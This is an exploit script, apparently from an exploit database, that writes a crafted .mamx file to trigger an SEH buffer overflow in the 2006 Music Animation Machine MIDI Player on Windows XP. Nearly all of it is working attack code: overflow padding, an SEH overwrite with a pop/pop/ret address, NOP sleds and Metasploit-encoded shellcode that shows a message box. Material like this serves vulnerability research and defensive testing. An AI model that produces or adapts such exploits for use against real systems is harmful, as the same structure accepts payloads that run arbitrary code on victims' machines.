# Exploit Title: Music Animation Machine MIDI Player MAMX SEH BOF
# Date 1/4/2011
# Author: Acidgen  mailto:spam(a t h)grayhat.se
# Software Link: http://www.musanim.com/player/MAMPlayer2006aug19_035.zip
# Version: 2006aug19 Release 035
# Tested on: Windows XP SP2 SE (Virtualbox Version: 3.2.10  Build:r66523)
# Credits go to c0d3R'Z, without his released MIDI POC/DoS 
# (http://www.exploit-db.com/exploits/15897/)
# I wouldn't have found this app to play with in the first place. 



#!/usr/bin/python


junk='\x41' * 112
seh='\xeb\x06\x90\x90'
pad='\x90' * 10
junk2='\x42' * 9496

# Sorry for this quick and dirty one;
# CALL DWORD PTR SS: EBP+C @ VBOXMRXN.DLL 
# When in Doubt, find your own pop,pop,ret
# VBOXMRXN.DLL Virtualbox Version: 3.2.10  Build:r66523
nseh='\xe5\xbd\x01\x10' 

 
# msfpayload windows/messagebox
# badchars \x00\xff\x1a\x0d\x0a\x09\x0b\x0c\x20
# [*] x86/shikata_ga_nai succeeded with size 364 (iteration=1)

pl=("\xd9\xce\xd9\x74\x24\xf4\x5b\x2b\xc9\xb8\xf4\x3a\xec\x53"
"\xb1\x55\x31\x43\x18\x83\xc3\x04\x03\x43\xe0\xd8\x19\x8a"
"\xe3\x86\x3b\x59\xd7\x4c\x8a\x70\xa5\xda\xdc\xbd\xad\xaf"
"\x6e\x0e\xa6\xc6\x9c\xe5\xce\x3a\x16\xbf\x26\xc8\x56\x60"
"\xbd\xf8\x9e\x2f\xd9\x71\x2c\xf6\xd8\xa8\x2d\xe8\xba\xc1"
"\xbe\xcf\x1e\x5d\x7b\x2c\xd5\x35\xac\x34\xe8\x5f\x27\x8e"
"\xf2\x14\x62\x2f\x03\xc0\x70\x1b\x4a\x9d\x43\xef\x4d\x4f"
"\x9a\x10\x7c\x4f\x21\x42\xfa\x8f\xae\x9c\xc3\xdf\x42\xa2"
"\x04\x34\xa8\x9f\xf6\xef\x79\x95\xe7\x7b\x23\x71\xe6\x90"
"\xb2\xf2\xe4\x2d\xb0\x5f\xe8\xb0\x2d\xd4\x14\x38\xb0\x03"
"\x9d\x7a\x97\xcf\xfc\x41\x65\xe7\xd7\x91\x03\x1d\xae\xd8"
"\x7c\x50\xfe\xd2\x90\x3e\x16\x75\x97\x40\x19\x03\x2d\xbb"
"\x5e\x6a\x76\x21\xd3\x14\x9a\x82\x41\xf3\x2d\x35\x9a\xfc"
"\xbb\x8f\x6c\x6b\xd0\x63\x4c\x2a\x40\x4f\xbe\x82\xf4\xc7"
"\xcb\xa9\x91\x65\xbb\x12\x7e\x80\x32\x4c\x28\x6b\x11\x95"
"\x5c\x51\xc9\x2e\xf6\xf4\xa4\xec\x80\xe5\x12\x5f\x67\x74"
"\xa5\xa0\x88\x1f\x6a\x6a\x2f\xc0\xe4\xf5\xbc\x65\xc4\x9d"
"\x10\x03\x48\x3b\xfd\x89\xdf\x85\xdd\x65\x8c\x4c\x56\x56"
"\x5a\x26\x08\xf3\xba\xd0\x99\x9a\xd9\x48\x4a\x34\x72\xe7"
"\xaa\xae\xe5\x9a\xcb\x5a\x9d\x07\x2c\xe2\x33\xa0\x61\x91"
"\xb8\x59\x4b\x82\xb6\xc6\x8f\x1e\x4f\x15\xa7\x39\x2a\xb4"
"\x60\xae\xf5\x2b\xf8\x4a\x9d\x8b\x98\xeb\x7d\xa4\x72\x48"
"\x31\x78\xe3\x1d\x9b\xd8\xbd\xf5\x4d\x9b\x0e\x5e\x19\x3b"
"\xf0\x2a\xf9\x53\x94\xa1\x9c\xd7\x30\x3f\x7e\x77\xa7\xd7"
"\x3a\xee\x55\x5c\xf3\x39\x11\xd0\xd7\x9e\xab\x08\x26\x33"
"\xc1\x8a\x1b\xe2\x44\xf4\x4b\x35\xa9\x5a\x94\x63\x21\x51")

buff=junk+seh+nseh+pad+pl+pad+junk2


try:
	filename = "crash.mamx"
	print "[-]Music Animation Machine MIDI Player mamx SEH BOF..."
	print "[-]Version:035 Release name: MAMPlayer2006-aug-19_035"
	print "[-]Author: Acidgen\n"
	print "[*]Generating crashfile:" + filename
	file = open(filename,"w")
	file.writelines(buff)
	file.close()
	print "[*]Done\n"

except:
	print "[X]Error..."
